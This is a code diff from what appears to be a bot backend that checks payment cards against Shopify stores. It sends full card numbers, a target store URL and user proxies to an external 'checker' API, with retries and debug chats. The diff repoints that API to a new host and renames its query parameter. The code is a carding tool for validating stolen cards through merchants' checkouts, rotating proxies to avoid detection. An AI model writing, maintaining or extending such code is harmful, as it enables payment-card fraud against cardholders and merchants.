@@ -5461,7 +5461,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 `);
 
         const startTime = Date.now();
-        const SHOPIFY_API_URL = "https://web-production-9db0.up.railway.app/shopify";
+        const SHOPIFY_API_URL = "https://xaeden.onrender.com/sh";
         const SHOPIFY_DEBUG_CHAT = "-1003848532661";
         const SH_UNKNOWN_RETRIES = 4;
 
@@ -5521,8 +5521,8 @@ Admin needs to add sites via Health Check.
           // Helper: single API call
           const callShopifyOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
             const apiUrl = proxy
-              ? `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-              : `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}`;
+              ? `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
+              : `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), 55000);
             try {
@@ -5873,7 +5873,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const { data: mshProxiesRaw } = await supabase.from("user_proxies").select("*").eq("user_id", mshProfile.user_id);
         const mshProxies = mshProxiesRaw || [];
 
-        const SHOPIFY_API_URL_MSH = "https://web-production-9db0.up.railway.app/shopify";
+        const SHOPIFY_API_URL_MSH = "https://xaeden.onrender.com/sh";
         const MSH_DEBUG_CHAT = "-1003848532661";
         const MSH_UNKNOWN_RETRIES = 3;
         const mshStartTime = Date.now();
@@ -5924,8 +5924,8 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         // Single call helper
         const mshCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
           const apiUrl = proxy
-            ? `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-            : `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}`;
+            ? `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
+            : `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
           const controller = new AbortController();
           const timeout = setTimeout(() => controller.abort(), 45000);
           try {
@@ -6284,7 +6284,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const { data: mtxtProxiesRaw } = await supabase.from("user_proxies").select("*").eq("user_id", mtxtProfile.user_id);
         const mtxtProxies = mtxtProxiesRaw || [];
 
-         const SHOPIFY_API_URL_MTXT = "https://web-production-9db0.up.railway.app/shopify";
+         const SHOPIFY_API_URL_MTXT = "https://xaeden.onrender.com/sh";
          const MTXT_MAX_RETRIES = 1; // Keep /mtxt fast: one hard API retry, then rotate site/card thread
          const MTXT_API_TIMEOUT_MS = 30000;
          const mtxtStartTime = Date.now();
@@ -6351,10 +6351,10 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
          // Single API call — exact match of web callApiOnce
           const mtxtBuildApiUrl = (cardCC: string, siteUrl: string, proxy: string) => {
-            // Query param format: domain/shopify?site={site}&cc={cc}
+            // Query param format: domain/sh?cc={cc}&url={site}&proxy={proxy}
             const params = new URLSearchParams();
-            params.set("site", siteUrl.trim());
             params.set("cc", cardCC.trim());
+            params.set("url", siteUrl.trim());
             if (proxy?.trim()) params.set("proxy", proxy.trim());
             return `${SHOPIFY_API_URL_MTXT}?${params.toString()}`;
           };
